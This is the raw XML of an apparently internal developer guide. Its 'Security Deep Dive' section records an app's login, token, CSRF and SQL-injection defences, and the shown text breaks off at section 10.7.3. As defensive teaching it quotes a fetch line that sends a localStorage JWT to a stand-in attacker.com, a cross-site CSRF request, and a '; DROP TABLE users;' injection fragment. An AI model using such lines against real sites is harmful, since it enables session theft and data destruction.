                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      &lt;/BrowserRouter&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;/AuthProvider&gt;);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w: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function ModulePlaceholder({ title, phase }) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  return (</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;div className="max-w-2xl"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      &lt;h2 className="text-2xl font-semibold text-ink"&gt;{title}&lt;/h2&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      &lt;p className="mt-2 text-sm text-ink-soft"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        This module ships in Phase {phase}. The route, permission gate, and layout chrome</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        are already in place — only the page body is pending implementation.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      &lt;/p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;/div&gt;);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="480" w:after="200"/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="4" w:color="4F5DFF"/>
        </w:pBdr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="4F5DFF"/>
          <w:sz w:val="48"/>
        </w:rPr>
        <w:t>Part X  ·  Security Deep Dive — What We Actually Wired</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="4B5563"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Phase 4 is a security-first build. This part documents every defensive layer that ended up in the code, separated by attack class. Not a textbook — a record of what's running in this codebase right now.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>10.1  Brute-Force Defence — Layered (5 layers)</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2550"/>
        <w:gridCol w:w="2550"/>
        <w:gridCol w:w="2550"/>
        <w:gridCol w:w="2550"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="567"/>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Layer</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3685"/>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Mechanism</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>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File</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>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Latency cost to attacker</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1</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Zod regex pre-check rejects malformed inputs</w:t>
            </w:r>
          </w:p>
        </w:tc>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auth.validators.js (BE) + loginSchema.js (FE)</w:t>
            </w:r>
          </w:p>
        </w:tc>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&lt;1ms (instant 422)</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2</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express-rate-limit: 10 attempts / 15 min / IP</w:t>
            </w:r>
          </w:p>
        </w:tc>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rateLimit.js — loginLimiter</w:t>
            </w:r>
          </w:p>
        </w:tc>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After 10 tries: 15-min lockout</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3</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bcrypt cost 10 (12 in prod)</w:t>
            </w:r>
          </w:p>
        </w:tc>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auth.service.js — bcrypt.compare</w:t>
            </w:r>
          </w:p>
        </w:tc>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~80ms per attempt → 80 sec/1000 tries</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4</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users.failed_login_count per-user counter</w:t>
            </w:r>
          </w:p>
        </w:tc>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users.repo.js — incrementFailedLogin</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>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Persistent across IPs</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5</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is_locked flag (set by future BR-AUTH-08 watcher)</w:t>
            </w:r>
          </w:p>
        </w:tc>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users.is_locked column (Phase 5+ guard)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Only Super Admin unlocks</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>10.2  Token Theft — Refresh-Rotation + Defensive Sweep</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="10200"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="10200"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FEE2E2"/>
            <w:tcBorders>
              <w:left w:val="single" w:sz="24" w:color="B91C1C"/>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="80"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="B91C1C"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">SECURITY  ·  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="21"/>
              </w:rPr>
              <w:t>Three-step protection model</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Step 1 — Refresh tokens are stored as SHA-256 hex in refresh_tokens.token_hash. The raw JWT never sits in the DB. If the DB is leaked, attackers cannot replay the stored hashes.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Step 2 — Every successful /refresh REVOKES the presented token before issuing a new one. A stolen token works AT MOST once.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Step 3 — On the next legitimate refresh, the attacker's old (now-revoked) token reappears. The service detects 'valid signature + DB miss' as a replay pattern and calls revokeAllForUser. Both attacker and legit user re-login; only the legit user has the password.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>10.3  XSS Defence — Token Placement Strategy</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Beginner tutorials say 'store JWT in localStorage'. Every senior security engineer says NO. The attack is concrete: a CDN-hosted dependency gets compromised, ships fetch(attacker.com, {body: localStorage.getItem('jwt')}) — every active token is exfiltrated within seconds.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Our model:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Access token in a JS module variable (api-client.js). Vulnerable to in-page XSS, BUT capped at 15-minute lifetime.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Refresh token in an httpOnly cookie cmcmis_rt. document.cookie cannot read it; no XSS in any dependency, anywhere in the tree, can exfiltrate it.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>CSRF token in a JS-readable cookie cmcmis_csrf. Double-submitted on /auth/refresh — a stolen cookie alone cannot trigger refresh because the attacker can't read the cookie cross-site to set the header.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Nothing in localStorage / sessionStorage / IndexedDB.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>10.4  CSRF Defence — SameSite=Lax + Double-Submit</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attack vs defence</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>// Without double-submit, an attacker's site could:</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>fetch('https://our-app.com/api/v1/auth/refresh',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      { method: 'POST', credentials: 'include' });</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>// The browser auto-attaches both our cookies. Server thinks it's legit.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With double-submit:</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>// - Server demands X-CSRF-Token header to match cmcmis_csrf cookie.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>// - Attacker's site can SEND the cookies but cannot READ cmcmis_csrf cross-site</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>//   (same-origin policy blocks document.cookie cross-domain).</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>// - Therefore the attacker cannot set a matching X-CSRF-Token header → 403.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>10.5  SQL Injection — Parameterised Queries + multipleStatements off</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Two layers stacked:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Every query in every *.repo.js uses `?` placeholders fed via the second arg to pool.query(). String concatenation of user input into SQL never appears.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>mysql2 pool created without multipleStatements → defaults to FALSE → a single injected fragment cannot chain ; DROP TABLE users; because the driver refuses multi-statement requests at runtime.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>10.6  User Enumeration — Generic 'Invalid credentials'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>All four failure paths (unknown employee_id, inactive, locked, bad password) return the exact same human-facing message. Internally we still distinguish via the login_audit ENUM, so forensics has full detail.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3400"/>
        <w:gridCol w:w="3400"/>
        <w:gridCol w:w="3400"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3685"/>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Actual server state</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>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audit outcome</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3685"/>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HTTP response message</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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employee_id not in users</w:t>
            </w:r>
          </w:p>
        </w:tc>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FAILED_NOT_FOUND</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Invalid credentials</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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users.is_active = 0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="226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FAILED_USER_INACTIVE</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Invalid credentials</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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users.is_locked = 1</w:t>
            </w:r>
          </w:p>
        </w:tc>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FAILED_USER_LOCKED</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Invalid credentials</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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bcrypt.compare returns false</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="226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FAILED_BAD_PASSWORD</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Invalid credentials</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>10.7  Browser DevTools — Live Forensics</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>10.7.1  Confirming httpOnly is working</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console</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>// In the browser console after sign-in:</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>document.cookie</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>// → "cmcmis_csrf=ab12cd…"      (no cmcmis_rt — that's correct)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If you see cmcmis_rt here, the cookie was set WITHOUT httpOnly. Stop. Fix the BE.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>10.7.2  Decoding the JWT live</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console</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const token = "eyJhbGciOiJIUzI1NiIs...";</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const payload = JSON.parse(atob(token.split('.')[1]));</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>console.log(payload);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>// { sub: "SA79900", uid: 1, role: "SUPER_ADMIN",</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>//   permissions: [...], iat: 17xxxx, exp: 17xxxx }</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new Date(payload.exp * 1000)</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>// → 15 minutes after iat</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>10.7.3  What XSS would see</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console</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
